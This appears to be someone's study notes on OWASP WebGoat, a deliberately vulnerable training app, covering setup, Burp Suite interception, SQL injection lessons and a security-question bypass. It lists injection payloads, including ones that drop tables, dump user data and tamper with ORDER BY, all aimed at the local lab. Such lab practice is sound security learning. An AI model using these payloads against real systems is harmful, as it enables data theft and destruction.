# web goat
owasp demo site

# installation

* download from git:
```
https://github.com/WebGoat/WebGoat
git clone git@github.com:WebGoat/WebGoat.git
```

* install maven in kali linux
```
https://tutorialforlinux.com/2017/04/13/how-to-install-latest-apache-maven-on-kali-linux-easy-guide/
```
* install by using mvn
```
source $HOME/.bashrc
mvn clean install

Now let's start by compiling the project.

cd WebGoat
git checkout develop
mvn clean install
Now we are ready to run the project. WebGoat 8.x is using Spring-Boot.

mvn -pl webwolf spring-boot:run
```

* run stand-alone :

```
download
https://github.com/WebGoat/WebGoat/releases
then
java -jar webgoatxxx.jar
then:
http://localhost:8080/WebGoat/login

```

# attack techniques:

I will try to practice test first then categorize them later

## General

* http/s basics: learn to intercept request by using zap/burpsuite

```
Go General/HTTP basics
Use burp suite to capture get/post method then edit and forward

result:
POST /WebGoat/HttpBasics/attack2 HTTP/1.1
magic_num=36&answer=&magic_answer=36

read the magic_numb then edit it

Identify type of request: post/get
```

* http proxies: learn how to deploy proxy on zap/burpsuite

## injection flow
https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF

  1. sql injection
  * data manipulation language (select, insert, update)
  * data definition language (create, alter, drop)
  * data control language (grant, revoke)

* numeric injection

* combining sql injection techniques
  ```
  special characters
   - /*
    '*/:comment the remainder of the query
   - ; allow query chaining  ex: 'select * from users; drop table users;'
   - || allow string concatenate
   - union : 'Select id, text from news union all select name, pass from users'
   - joins
  ```
* blind sql injection
```
```

  2. examples:
```
- simple sql injection:
serName = Smith' or '1'='1
userName =' or 1=1 --
userID = 1234567 or 1=1
UserName = Smithâ€™;drop table users; truncate audit_log;--

- advance sql injection:
Smith'; select * from user_system_data where '1'='1

-blind sql injection:
https://my-shop.com?article=4
>> SELECT * from articles where article_id = 4

```

  3. practices:
  * simple sql injection
```
http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjection.lesson/6
input: Smith' or '1'='1
then submit

http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjection.lesson/7
input : 123456 or 1=1
then submit

```
  * advance sql injection
  ```
  http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/2
  6.a input: Smith'; select * from user_system_data where '1'='1
  105, dave, dave, ,
  6.b input: dave
  ```

  * combine all: burpsuite: could user repeater module to input data to save time to make request
  ```
  http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4
  tried : http://sechow.com/bricks/docs/login-1.html but failed

  ```

  4. sql injection mitigations

  ```
  use order by
  http://192.168.60.148:8080/WebGoat/SqlInjection/servers?column=id
  edit query:
  column=(case when (true) then hostname else id end)

  input ip address: 192.168.6.4
  click submit
  ```

## Authentication flows

### Authentication bypasses
https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass
1. concept:
usually take advantage of some flaw in the configuration or logic

* hidden inputs
* removing parameters
* forced browsing

2. practices:
There are many ways to practice this:
check hidden account which comment in source
remove parameters/change parameters name

```
http://localhost:8080/WebGoat/start.mvc#lesson/AuthBypass.lesson/1
intercept the post method
secQuestion0=test&secQuestion1=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746

change the parameter name:
secQuestion3=test&secQuestion4=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746

magicly it passed
```

### JWT tokens (under development)
https://jwt.io/introduction/
